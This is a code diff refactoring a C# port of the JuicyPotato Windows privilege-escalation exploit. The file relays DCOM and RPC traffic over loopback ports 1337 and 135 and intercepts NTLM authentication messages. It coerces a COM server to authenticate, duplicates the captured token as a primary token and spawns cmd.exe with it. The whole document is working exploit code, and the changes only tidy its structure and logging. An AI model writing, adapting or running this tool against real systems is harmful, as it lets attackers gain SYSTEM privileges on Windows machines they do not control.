@@ -1,7 +1,7 @@
 ﻿using System.Collections.Concurrent;
+using System.Diagnostics;
 using System.Net;
 using System.Net.Sockets;
-using System.Runtime.InteropServices;
 using System.Text;
 using Vanara.InteropServices;
 using Vanara.PInvoke;
@@ -14,85 +14,79 @@ namespace sharp_potato;
 
 public unsafe class JuicyPotato
 {
-    public string OleString { get; set; } = "03ca98d6-ff5d-49b8-abc6-03dd84127020";
-    public IPEndPoint ServerEndPoint { get; set; } = new(IPAddress.Loopback, 1337);
+    public bool EnableDebugLogging { get; set; } = false;
+    public Guid CLSID { get; set; } = Guid.Parse("03ca98d6-ff5d-49b8-abc6-03dd84127020");
+    public IPEndPoint ComServerEndPoint { get; set; } = new(IPAddress.Loopback, 1337);
+    public IPEndPoint RpcServerEndPoint { get; set; } = new(IPAddress.Loopback, 135);
     public LocalNegotiator Negotiator { get; } = new();
 
+    private const int BUFFER_LENGTH = 4096;
     private readonly BlockingCollection<byte[]> queueSendCom = new();
     private readonly BlockingCollection<byte[]> queueSendRpc = new();
-    private bool newConnection = false;
+    private Thread comListenerThread;
+    private Thread rpcConnectionThread;
+    private bool newConnection;
 
-    public void startRPCConnectionThread()
+    public void StartRPCConnectionThread()
     {
-        new Thread(startRPCConnection).Start();
+        rpcConnectionThread = new Thread(StartRPCConnection);
+        rpcConnectionThread.Start();
     }
 
-    public void startCOMListenerThread()
+    public void StartCOMListenerThread()
     {
-        new Thread(startCOMListener).Start();
+        comListenerThread = new Thread(StartCOMListener);
+        comListenerThread.Start();
     }
 
-    private void startCOMListener()
+    private void StartCOMListener()
     {
-        string dcom_port = "1337";
-        Console.Write($"COM> startCOMListener ({dcom_port})\n");
+        if (EnableDebugLogging)
+            Console.Write($"COM> startCOMListener ({ComServerEndPoint.Port})\n");
 
-        var listener = new TcpListener(IPAddress.Any, int.Parse(dcom_port));
+        var listener = new TcpListener(ComServerEndPoint);
         listener.Start();
 
-        const int BUFFER_LENGTH = 4096;
-
         var client = listener.AcceptTcpClient();
-        if (client == null)
-        {
-            Console.Write("COM> ERR: Failed to accept TCP client.\n");
-            return;
-        }
 
-        int iSendResult;
-        byte[] sendBuffer;
         var receiveBuffer = new byte[BUFFER_LENGTH];
         int iResult;
         do
         {
             iResult = client.GetStream().Read(receiveBuffer, 0, BUFFER_LENGTH);
-            Console.Write($"COM> Read result: {iResult} from COM (1337 <- COM)\n");
+            if (EnableDebugLogging)
+                Console.Write($"COM> Read result: {iResult} from COM (1337 <- COM)\n");
             if (iResult > 0)
             {
-                //check to see if the received packet has NTLM auth information
                 fixed (byte* ptrReceiveBuffer = receiveBuffer)
-                    processNtlmBytes(ptrReceiveBuffer, iResult);
+                    ProcessNtlmBytes(ptrReceiveBuffer, iResult);
 
-                Console.Write($"COM> Adding {iResult} bytes to RPC_Queue\n");
-                // queueSendRpc->add_item(DataBuffer{ receiveBuffer, iResult });
+                if (EnableDebugLogging)
+                    Console.Write($"COM> Adding {iResult} bytes to RPC_Queue\n");
                 queueSendRpc.Add(receiveBuffer[..iResult]);
 
-                //block and wait for a new item in our sendq
                 var buffer = queueSendCom.Take();
-                sendBuffer = buffer;
-                Console.Write($"COM> Popped {buffer.Length} bytes from COM_Queue\n");
+                if (EnableDebugLogging)
+                    Console.Write($"COM> Popped {buffer.Length} bytes from COM_Queue\n");
 
-                //Check to see if this is a packet containing NTLM authentication information before sending
-                fixed (byte* ptrSendBuffer = sendBuffer)
-                    processNtlmBytes(ptrSendBuffer, sendBuffer.Length);
+                fixed (byte* ptrSendBuffer = buffer)
+                    ProcessNtlmBytes(ptrSendBuffer, buffer.Length);
 
-                //send the new packet sendBuffer
-                Console.Write($"COM> Sending {buffer.Length} bytes to COM (1337 -> COM)\n");
-                client.GetStream().Write(sendBuffer, 0, buffer.Length);
+                if (EnableDebugLogging)
+                    Console.Write($"COM> Sending {buffer.Length} bytes to COM (1337 -> COM)\n");
+                client.GetStream().Write(buffer, 0, buffer.Length);
 
-                //Sometimes Windows likes to open a new connection instead of using the current one
-                //Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
-                Thread.Sleep(1000);
+                Thread.Sleep(10);
                 if ((newConnection = listener.Pending()) != false)
                 {
-                    Console.Write("COM> New TCP connection is pending, accepting.\n");
+                    if (EnableDebugLogging)
+                        Console.Write("COM> New TCP connection is pending, accepting.\n");
                     client.Close();
                     client = listener.AcceptTcpClient();
                 }
             }
             else if (iResult == 0)
             {
-                //connection closing...
                 client.Close();
                 Environment.Exit(-1);
             }
@@ -104,57 +98,53 @@ public unsafe class JuicyPotato
             }
         } while (iResult > 0);
 
-        // shutdown the connection since we're done
         client.Close();
     }
 
-    private void startRPCConnection()
+    private void StartRPCConnection()
     {
-        Console.Write("                                             RPC> startRPCConnection\n");
-
-        const int BUFFER_LENGTH = 4096;
-
-        const string myHost = "127.0.0.1";
-        const string myPort = "135";
+        if (EnableDebugLogging)
+            Console.Write("                                             RPC> startRPCConnection\n");
 
         var client = new TcpClient();
-        client.Connect(myHost, int.Parse(myPort));
+        client.Connect(RpcServerEndPoint);
 
-        byte[] sendBuffer;
         byte[] receiveBuffer = new byte[BUFFER_LENGTH];
         int iResult;
         int receiveBufferLength = BUFFER_LENGTH;
 
-        // Write/Read until the peer closes the connection
         do
         {
-            //Monitor our sendQ until we have some data to send
             var buffer = queueSendRpc.Take();
-            sendBuffer = buffer;
-            Console.Write($"                                             RPC> Popped item from RPC_Queue ({buffer.Length} bytes)\n");
+            if (EnableDebugLogging)
+                Console.Write($"                                             RPC> Popped item from RPC_Queue ({buffer.Length} bytes)\n");
 
-            //Check if we should be opening a new socket before we send the data
-            if (newConnection == true)
+            if (newConnection)
             {
-                Console.Write("                                             RPC> startRPCConnection -> newConnection was 1\n");
+                if (EnableDebugLogging)
+                    Console.Write("                                             RPC> startRPCConnection -> newConnection was 1\n");
                 client = new TcpClient();
-                client.Connect(myHost, int.Parse(myPort));
+                client.Connect(RpcServerEndPoint);
                 newConnection = false;
             }
 
-            Console.Write($"                                             RPC> Writing {buffer.Length} bytes to RDP (this -> 135)\n");
-            client.GetStream().Write(sendBuffer, 0, buffer.Length);
+            if (EnableDebugLogging)
+                Console.Write($"                                             RPC> Writing {buffer.Length} bytes to RDP (this -> 135)\n");
+            client.GetStream().Write(buffer, 0, buffer.Length);
 
             iResult = client.GetStream().Read(receiveBuffer, 0, receiveBufferLength);
-            Console.Write($"                                             RPC> Read {iResult} bytes from RDP (this <- 135)\n");
+            if (EnableDebugLogging)
+                Console.Write($"                                             RPC> Read {iResult} bytes from RDP (this <- 135)\n");
             if (iResult > 0)
             {
-                Console.Write($"                                             RPC> Adding {iResult} bytes to COM_Queue\n");
+                if (EnableDebugLogging)
+                    Console.Write($"                                             RPC> Adding {iResult} bytes to COM_Queue\n");
                 queueSendCom.Add(receiveBuffer[..iResult]);
             }
             else if (iResult == 0)
             {
-                Console.Write("                                             RPC> Connection closed\n");
+                if (EnableDebugLogging)
+                    Console.Write("                                             RPC> Connection closed\n");
             }
             else
             {
@@ -163,17 +153,11 @@ public unsafe class JuicyPotato
             }
         } while (iResult > 0);
 
-        //Console.Write("last iResult:%d\n", iResult);
-
-        // cleanup
         client.Close();
     }
 
-    private int findNTLMBytes(byte* bytes, int length)
+    private static int FindNTLMBytes(byte* bytes, int length)
     {
-        //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
-        //The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
-        //we can just return the index
         var pattern = new byte[] {0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50};
         int pIdx = 0;
         int i;
@@ -193,13 +177,14 @@ public unsafe class JuicyPotato
         return -1;
     }
 
-    private int processNtlmBytes(byte* bytes, int length)
+    private int ProcessNtlmBytes(byte* bytes, int length)
     {
-        int ntlmLoc = findNTLMBytes(bytes, length);
+        int ntlmLoc = FindNTLMBytes(bytes, length);
         if (ntlmLoc == -1) return -1;
 
         int messageType = bytes[ntlmLoc + 8];
-        Console.Write($"[NTLM/{length}] Will handle {length - ntlmLoc} bytes starting from {ntlmLoc} (type = {messageType})\n");
+        if (EnableDebugLogging)
+            Console.Write($"[NTLM/{length}] Will handle {length - ntlmLoc} bytes starting from {ntlmLoc} (type = {messageType})\n");
         switch (messageType)
         {
             case 1:
@@ -221,13 +206,14 @@ public unsafe class JuicyPotato
 
     public void TriggerDCOM()
     {
-        Console.Out.WriteLine("TriggerDCOM");
+        if (EnableDebugLogging)
+            Console.Out.WriteLine("TriggerDCOM");
 
         CoInitialize(IntPtr.Zero);
         CreateILockBytesOnHGlobal(IntPtr.Zero, true, out var lb);
         StgCreateDocfileOnILockBytes(lb, STGM.STGM_CREATE | STGM.STGM_READWRITE | STGM.STGM_SHARE_EXCLUSIVE, 0, out var stg);
 
-        var t = new StorageTrigger(stg, ServerEndPoint);
+        var t = new StorageTrigger(stg, ComServerEndPoint);
 
         var tmp = Guid.Parse("00000000-0000-0000-C000-000000000046");
         var qis = new MULTI_QI[]
@@ -240,10 +226,10 @@ public unsafe class JuicyPotato
             }
         };
 
-        var guid = Guid.Parse(OleString);
-        CoGetInstanceFromIStorage(null, guid, null, CLSCTX.CLSCTX_LOCAL_SERVER, t, 1, qis);
+        CoGetInstanceFromIStorage(null, CLSID, null, CLSCTX.CLSCTX_LOCAL_SERVER, t, 1, qis);
 
-        Console.Out.WriteLine("TriggerDCOM End");
+        if (EnableDebugLogging)
+            Console.Out.WriteLine("TriggerDCOM End");
     }
 
     public void WaitForAuth()
@@ -261,16 +247,18 @@ public unsafe class JuicyPotato
         EnablePrivilege(hToken, "SeAssignPrimaryTokenPrivilege");
         OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out hToken);
         QuerySecurityContextToken(Negotiator.Context, out var elevatedToken);
-        IsTokenSystem(hToken);
+        // IsTokenSystem(hToken); // TODO
 
         var tokenType = elevatedToken.GetInfo<TOKEN_TYPE>();
-        Console.Out.WriteLine(tokenType);
+        if (EnableDebugLogging)
+            Console.Out.WriteLine(tokenType);
 
         DuplicateTokenEx(elevatedToken, TokenAccess.TOKEN_ALL_ACCESS, null,
             SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out var dupedToken);
 
         tokenType = dupedToken.GetInfo<TOKEN_TYPE>();
-        Console.Out.WriteLine(tokenType);
+        if (EnableDebugLogging)
+            Console.Out.WriteLine(tokenType);
 
         CreateProcessWithTokenW(dupedToken, 0, "cmd.exe", new StringBuilder("cmd.exe"),
             0, null, null, new STARTUPINFO {lpDesktop = "winsta0\\default"}, out var processInformation);
